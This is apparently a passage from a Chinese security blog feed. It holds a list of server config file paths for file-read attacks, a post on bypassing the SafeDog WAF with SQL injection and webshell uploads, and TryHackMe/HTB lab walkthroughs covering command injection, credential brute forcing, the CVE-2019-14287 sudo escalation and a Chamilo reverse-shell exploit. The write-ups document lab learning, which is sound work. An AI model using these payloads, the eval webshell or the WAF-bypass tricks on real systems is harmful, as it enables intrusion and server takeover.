class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/apache/</span>apache<span class="hljs-regexp">/conf/</span>httpd.conf<br><span class="hljs-regexp">/apache/</span>apache2<span class="hljs-regexp">/conf/</span>httpd.conf<br><span class="hljs-regexp">/apache/</span>php<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/bin/</span>php.ini<br><span class="hljs-regexp">/etc/</span>apache<span class="hljs-operator">/</span>apache.conf<br><span class="hljs-regexp">/etc/</span>apache<span class="hljs-operator">/</span>httpd.conf<br><span class="hljs-regexp">/etc/</span>apache2<span class="hljs-operator">/</span>apache.conf<br><span class="hljs-regexp">/etc/</span>apache2<span class="hljs-operator">/</span>httpd.conf<br><span class="hljs-regexp">/etc/</span>apache2<span class="hljs-regexp">/sites-available/</span><span class="hljs-keyword">default</span><br><span class="hljs-regexp">/etc/</span>apache2<span class="hljs-regexp">/vhosts.d/</span>00_default_vhost.conf<br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf.d/</span>httpd.conf<br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf.d/</span>php.conf<br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf<br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>httpd<br><span class="hljs-regexp">/etc/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/apache/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/apache2/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/cgi/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/php4/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php4.<span class="hljs-number">4</span><span class="hljs-regexp">/fcgi/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php4<span class="hljs-regexp">/apache/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php4<span class="hljs-regexp">/apache2/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php4<span class="hljs-regexp">/cgi/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php5<span class="hljs-regexp">/apache/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php5<span class="hljs-regexp">/apache2/</span>php.ini<br><span class="hljs-regexp">/etc/</span>php5<span class="hljs-regexp">/cgi/</span>php.ini<br><span class="hljs-regexp">/etc/</span>phpmyadmin<span class="hljs-operator">/</span>config.inc.php<br><span class="hljs-regexp">/home/</span>apache<span class="hljs-regexp">/conf/</span>httpd.conf<br><span class="hljs-regexp">/home/</span>apache2<span class="hljs-regexp">/conf/</span>httpd.conf<br><span class="hljs-regexp">/home/</span>bin<span class="hljs-regexp">/stable/</span>apache<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/home2/</span>bin<span class="hljs-regexp">/stable/</span>apache<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/NetServer/</span>bin<span class="hljs-regexp">/stable/</span>apache<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/opt/</span>www<span class="hljs-regexp">/conf/</span>httpd.conf<br><span class="hljs-regexp">/opt/</span>xampp<span class="hljs-regexp">/etc/</span>php.ini<br><span class="hljs-regexp">/PHP/</span>php.ini<br><span class="hljs-regexp">/php/</span>php.ini<br><span class="hljs-regexp">/php4/</span>php.ini<br><span class="hljs-regexp">/php5/</span>php.ini<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/etc/</span>nginx<span class="hljs-operator">/</span>nginx.conf<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/php/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>conf<span class="hljs-operator">/</span>httpd.conf<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>conf<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>conf<span class="hljs-operator">/</span>httpd.conf<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>conf<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/httpd/</span>conf<span class="hljs-operator">/</span>httpd.conf<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php/</span>lib<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php4/</span>lib<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php4/</span>lib<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php4/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php5/</span>etc<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php5/</span>lib<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php5/</span>php5.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>examples<span class="hljs-regexp">/php/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>examples<span class="hljs-regexp">/php4/</span>php.ini<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/Zend/</span>etc<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/var/</span>apache2<span class="hljs-operator">/</span>config.inc<br><span class="hljs-regexp">/var/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf<br><span class="hljs-regexp">/var/</span>httpd<span class="hljs-regexp">/conf/</span>php.ini<br><span class="hljs-regexp">/var/</span>httpd<span class="hljs-regexp">/conf/</span>php.ini<br><span class="hljs-regexp">/var/</span>local<span class="hljs-regexp">/www/</span>conf<span class="hljs-operator">/</span>httpd.conf<br><span class="hljs-regexp">/var/</span>local<span class="hljs-regexp">/www/</span>conf<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/conf/</span>httpd.conf<br><span class="hljs-regexp">/web/</span>conf<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/www/</span>conf<span class="hljs-operator">/</span>httpd.conf<br><span class="hljs-regexp">/www/</span>php<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/www/</span>php4<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/www/</span>php5<span class="hljs-operator">/</span>php.ini<br><span class="hljs-regexp">/xampp/</span>apache<span class="hljs-regexp">/bin/</span>php.ini<br><span class="hljs-regexp">/xampp/</span>apache<span class="hljs-regexp">/conf/</span>httpd.conf<br></code></pre></td></tr></table></figure><h2 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/etc/init.d/mysql<br><span class="hljs-regexp">/etc/my</span>.cnf<br><span class="hljs-regexp">/etc/mysql</span><span class="hljs-regexp">/my.cnf</span><br><span class="hljs-regexp">/etc</span><span class="hljs-regexp">/mysql/my</span>.cnf<br><span class="hljs-regexp">/var/lib</span><span class="hljs-regexp">/mysql/my</span>.cnf<br><span class="hljs-regexp">/var/lib</span><span class="hljs-regexp">/mysql/mysql</span><span class="hljs-regexp">/user.MYD</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/local/mysql</span><span class="hljs-regexp">/bin/mysql</span><br><span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/mysql/my</span>.cnf<br><span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/mysql/my</span>.cnf<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全狗绕过</title>
    <link href="/2024/11/11/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/"/>
    <url>/2024/11/11/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="完成-SQL-注入场景下绕过安全狗"><a href="#完成-SQL-注入场景下绕过安全狗" class="headerlink" title="完成 SQL 注入场景下绕过安全狗"></a>完成 SQL 注入场景下绕过安全狗</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081805544.png" alt="image.png"><br>首先依旧是orderby，但是发现狗没有对orderby进行过滤<br>然后就是爆字段<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081805590.png" alt="image.png"><br>这里也不知道有没有过滤，反正习惯性大小写就直接出了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081805994.png" alt="image.png"><br>database()，开始出现过滤<br>这里尝试@@database，没有成功，但发现似乎没有对database进行过滤，那么可能就是对database()有过滤<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081805013.png" alt="image.png"><br>我们尝试在database跟()中间插入数据<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081805306.png" alt="image.png"><br>我们先是试试在()里填入数据，发现没意义<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081805299.png" alt="image.png"><br>内联注释绕过得到数据库名<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804525.png" alt="image.png"><br>爆全部库名，发现from后面随便加什么都会被过滤，试了一下都有点问题，于是我们先去爆表名<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804475.png" alt="image.png"><br>发现一点过滤都没有<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804533.png" alt="image.png"><br>重新构造payload时发现其实是有过滤的，还是from处有过滤，但是只要把form前面的空格删掉，过滤就失效了，接下来就是很顺利地注出数据<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804621.png" alt="image.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>砸了一堆脏数据，然后发现直接全过了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804578.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804496.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804719.png" alt="image.png"><br>感觉毫无技巧可言，就是堆<br>感觉狗对POST检测不是很好，这里换成get类型再bypass下试试</p><h1 id="完成-SQL-注入场景下绕过安全狗二"><a href="#完成-SQL-注入场景下绕过安全狗二" class="headerlink" title="完成 SQL 注入场景下绕过安全狗二"></a>完成 SQL 注入场景下绕过安全狗二</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804022.png" alt="image.png"><br>这里直接被拦<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804093.png" alt="image.png"><br>内联注释加版本号过<br>order by被拦，但是group by没事<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804105.png" alt="image.png"><br>union select一起出现就被拦，继续内联注释绕过<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804463.png" alt="image.png"><br>database()连在一起的时候被过滤了，还是内联的版本号就能绕过<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804441.png" alt="image.png"><br>因为还看到user不是root而是Pikachu权限可能有点不够，我们直接考虑爆破当前库的表<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804837.png" alt="image.png"><br>infomation_schem都不会被拦，但是填完整就被拦<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804036.png" alt="image.png"><br>这里怎么绕都绕不过去，后面发现自带的url编码有点问题<br><code>-1%27%20union/*/!*!/*/select%201,group_concat(table_name)%20from%20/*!--%20/*%0ainformation_schema.tables*//*/!*!/*/where%20table_schema=database(/*!11444*/)%20--+</code><br>改为手动的<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804440.png" alt="image.png"><br>然后爆列，table_name都不过滤，过滤table_name&#x3D;<br>还好，还是刚才的<code>/*/!*!/*/</code>就能绕<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804448.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804599.png" alt="image.png"><br>最后的爆数据就很简单了</p><h1 id="完成文件上传场景下绕过安全狗"><a href="#完成文件上传场景下绕过安全狗" class="headerlink" title="完成文件上传场景下绕过安全狗"></a>完成文件上传场景下绕过安全狗</h1><p>先就改个后缀名试试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804807.png" alt="image.png"><br>毫无疑问被拦<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804118.png" alt="image.png"><br>去掉后面的引号，直接成功了<br>然后就是内容绕过<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804121.png" alt="image.png"><br>有&lt;直接拦，别的都不拦<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804709.png" alt="image.png"><br>我上传个jpg带&lt;括号都拦<br>最后选择了上传个图片，后面加上php代码<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804096.png" alt="image.png"><br>成功<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804135.png" alt="image.png"><br>再加上免杀马<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804980.png" alt="image.png"></p><p>题外话：<br>在测试时发现<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804086.png" alt="image.png"><br>这种最简单的文件上传，虽然毫无疑问会被拦截，但是事实上是传到了服务器上的<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804452.png" alt="image.png"><br>但如果是含有很明显命令执行的函数，<br>如<code>&lt;?php eval($_POST[&#39;pwd&#39;]);?&gt;</code><br>会出现<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081804732.png" alt="image.png"><br>我们再升级下马的内容<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081805209.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081805282.png" alt="image.png"><br>还是能正常连接的<br>那如果我们知道了它文件上传名字的规律（通过上传正常的文件可以得到）<br>那其实我们也能进行getshell</p>]]></content>
    
    
    <categories>
      
      <category>WAF绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WAF</tag>
      
      <tag>绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY14-Ultratech</title>
    <link href="/2024/11/11/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY14-Ultratech/"/>
    <url>/2024/11/11/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY14-Ultratech/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY14-Ultratech"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY14-Ultratech" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY14-Ultratech"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY14-Ultratech</h1><p><a href="https://tryhackme.com/r/room/ultratech1">尝试黑客 |超科技 — TryHackMe | UltraTech</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828933.png" alt="image-20240407193444028"></p><p>先用rustscan快速扫描全端口</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828936.png" alt="image-20240407193526058"></p><p>再用nmap拿信息</p><p>这里可以看到8081跟31331是http，21没开匿名访问，22暂时也没有好的信息(21,22都没办法直接连，弱口令也没效果)扫扫两个开http的看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828943.png" alt="image-20240407195053634"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828944.png" alt="image-20240407202547831"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828951.png" alt="image-20240408094734998"></p><p>31331</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828949.png" alt="image-20240408094859472"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828589.png" alt="image-20240408094918799"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828625.png" alt="image-20240408095005542"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828662.png" alt="image-20240408095029982"></p><p>找到一个可以登陆的后台，但是我们没有账号密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828772.png" alt="image-20240408102313444"></p><p>images就真的是些图片</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828831.png" alt="image-20240408102337527"></p><p>js里面有三个js文件，这里有一个未经过滤的注入口，就是刚才扫出来的8081的&#x2F;ping看看这里能不能出点什么</p><p>但这台靶机好像有点问题，我访问不了它的8081端口</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828041.png" alt="image-20240408102100263"></p><p>修改了hosts文件之后才成功访问</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828307.png" alt="image-20240408102455788"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828332.png" alt="image-20240408102541390"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828482.png" alt="image-20240408103220247"></p><p>发现用&#96;(反引号)可以爆出信息</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828752.png" alt="image-20240408103430580"></p><p>r00t(注意是00):</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828781.png" alt="image-20240408103751592"></p><p>n100906</p><p>admin:</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828808.png" alt="image-20240408103531218"></p><p>mrsheafy</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828995.png" alt="image-20240408104032217"></p><p>进入后台</p><p>这里看到个docker</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828448.png" alt="image-20240408104410533"></p><p>再用脚本跑一下，同样提示可以用docker提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828479.png" alt="image-20240408105523314"></p><p>先看看有什么</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828515.png" alt="image-20240408105925442"></p><p>拿下</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081828540.png" alt="image-20240408105913225"></p><p>在~&#x2F;.ssh</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY15-Year Of The Rabbit</title>
    <link href="/2024/11/11/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY15-Year%20Of%20The%20Rabbit/"/>
    <url>/2024/11/11/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY15-Year%20Of%20The%20Rabbit/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY15-Year-Of-The-Rabbit"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY15-Year-Of-The-Rabbit" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY15-Year Of The Rabbit"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY15-Year Of The Rabbit</h1><p><a href="https://tryhackme.com/r/room/yearoftherabbit">尝试黑客 |兔年 — TryHackMe | Year of the Rabbit</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830294.png" alt="image-20240408110727579"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830304.png" alt="image-20240408111054110"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830312.png" alt="image-20240408111205921"></p><p>好好好</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830327.png" alt="image-20240408113151203"></p><p>线索</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830308.png" alt="image-20240408113314956"></p><p>但是到这里又断了，回到刚才那里再试一次</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830330.png" alt="image-20240408114911386"></p><p>抓包发现线索</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830042.png" alt="image-20240408115126906"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830175.png" alt="image-20240408115216865"></p><p>ok，hotbabe</p><p>把照片拿去分析</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830299.png" alt="image-20240409083719995"></p><p>发现这里面藏有ftp的用户名</p><p>ftpuser</p><p>跟可能的密码</p><p>我们使用strings把密码copy到pass.txt中</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830389.png" alt="image-20240409084200757"></p><p>hydra爆破出密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830468.png" alt="image-20240409084322189"></p><p>提取出文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830912.png" alt="image-20240409084343178"></p><p>brainfuck加密</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830006.png" alt="image-20240409085202923"></p><p>得到用户名密码</p><p>User: eli<br>Password: DSpDiM1wAEwid</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830296.png" alt="image-20240409085316770"></p><p>ssh连接成功进入目标机</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830335.png" alt="image-20240409085420815"></p><p>发现还有别的用户</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830164.png" alt="image-20240409085501137"></p><p>而且user.txt也在里面</p><p>看看能不能直接提权</p><p>使用linpeas.sh查看之后没有什么好的提权方法，那好吧，继续找线索</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830165.png" alt="image-20240409091003038"></p><p>在我们的一开始，就让我们找到这个s3cr3t，那我们找找看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830338.png" alt="image-20240409091651115"></p><p>一下找到三个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830493.png" alt="image-20240409091753024"></p><p>这个应该就是密码</p><p>再联系刚才的账号，我们再次用ssh进行连接</p><p>gwendoline</p><p>MniVCQVhQHUNI</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830568.png" alt="image-20240409092003893"></p><p>拿到flag</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830600.png" alt="image-20240409092211949"></p><p>CVE-2019-14287</p><p>有个漏洞直接绕过</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo -u#-<span class="hljs-number">1</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vi /</span>home<span class="hljs-regexp">/gwendoline/u</span>ser.txt<br></code></pre></td></tr></table></figure><p>然后</p><p>:!&#x2F;bin&#x2F;bash</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830684.png" alt="image-20240409092846999"></p><p>提权成功</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081830741.png" alt="image-20240409093036257"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb靶场-PermX</title>
    <link href="/2024/10/12/PermX/"/>
    <url>/2024/10/12/PermX/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121738505.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121739009.png" alt="image.png"><br>这道题会指向一个网址<a href="http://permx.htb/">http://permx.htb</a><br>如果我们直接访问肯定是会失败的，所以我们需要修改&#x2F;etc&#x2F;hosts<br>在最下面加上10.10.xx.xx permx.htb即可<br>或是<br><code>echo &#39;10.10.xx.xx permx.htb&#39; &gt;&gt; /etc/hosts</code><br>这道题需要修改hosts解析，我认为肯定也是有特殊含义的，这也是我第一次遇到说一定要这么改的，那有没有一种可能它除了www，还有别的子域，模仿真实的渗透呢，这里爆破下<br><code>ffuf -c -u &#39;http://permx.htb&#39; -H &#39;host: FUZZ.permx.htb&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301,302 -mc all</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121801086.png" alt="image.png"><br>真的有，也加到hosts里<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409122218567.png" alt="image.png"><br>与此同时我们进行目录的爆破<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121746340.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409122220626.png" alt="image.png"><br>再看看新的网站，chamilo<br>登录框那肯定先登陆下试试，我的弱口令都失败了，没办法，接着看，忘记密码也不行，开扫<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409122235280.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409122234814.png" alt="image.png"><br>扫出来很多，看看config，logs，readme.me什么的可能会有线索<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409122238596.png" alt="image.png"><br>比如这里可以看到它的版本，我们就可以考虑后续找个exp打<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409122241059.png" alt="image.png"><br>发现有目录遍历，耐心看看，反正我没耐心，直接搜</p><h1 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201237022.png" alt="image.png"><br>看到一个无需身份验证的洞，试试<br><a href="https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS">Rai2en&#x2F;CVE-2023-4220-Chamilo-LMS: This is a script written in Python that allows the exploitation of the Chamilo’s LMS software security flaw described in CVE-2023-4220 (github.com)</a><br>还找到个直接利用的payload，里面例子刚好就是这道题，不用白不用，试试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201248432.png" alt="image.png"><br>不知道为什么一用就自动给我清屏了，反正能用<br><code>python main.py -u http://xxxxxx -a scan</code><br>这个是检测语句<br>我们直接反弹shell<br><code>python main.py -u http:// -a revshell</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201253206.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201254222.png" alt="image.png"><br>成功getshell<br><img 